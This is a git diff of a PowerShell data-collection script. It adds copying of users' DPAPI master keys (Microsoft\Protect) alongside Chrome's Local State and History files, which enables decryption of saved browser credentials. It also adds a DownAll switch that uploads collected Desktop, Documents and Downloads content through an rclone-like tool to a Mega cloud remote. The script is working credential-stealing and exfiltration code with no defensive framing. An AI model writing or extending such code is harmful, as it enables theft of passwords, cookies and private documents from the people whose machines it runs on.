@@ -3,6 +3,7 @@ param (
     [switch]$First,
     [switch]$Chrome,
     [switch]$Stream,
+    [switch]$DownAll,
     [string]$objName,
     [string]$destMega
 )
@@ -56,6 +57,8 @@ function Chrome-Copy ($usersDir) {
     $chromeUserDir = ($chromeDestDir + $usersDir.Name + '\'); New-Item $chromeUserDir -ItemType Directory -ea 0
     $chromeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Google\chrome\user data\')
     Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDir)
+    Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($chromeUserDir)
+    attrib.exe -h -s ($chromeUserDir + '\*') /s; attrib +h +s ($chromeUserDir + '\CREDHIST'); attrib +h +s ($chromeUserDir + '\SYNCHIST')
 
     foreach ($profile in (gci -Path $chromeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
         $chromeProfileDir = ($chromeUserDir + $profile.Directory.Name + '\'); New-Item $chromeProfileDir -ItemType Directory -ea 0
@@ -90,7 +93,9 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($destMega -eq "") { $destMega = "ZSUDocs" }
 
-    if (($First -ne $true) -and ($Stream -ne $true) -and ($Chrome -ne $true)) {echo "You must specify at least one of <First> or <Stream>"}
+    if (($First -ne $true) -and ($Stream -ne $true) -and ($Chrome -ne $true) -and ($DownAll -ne $true)) {
+        echo "You must specify at least one of <First> or <Stream> or <DownAll>"
+    }
 
     if ($Stream -OR $First) { 
         echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
@@ -108,6 +113,11 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($First) {
         Secure-Copy -param $false
+        echo "Upload Documents . . ." 
+        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
+    }
+
+    if ($DownAll) {
         echo "Upload Documents . . ." 
         &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
     }
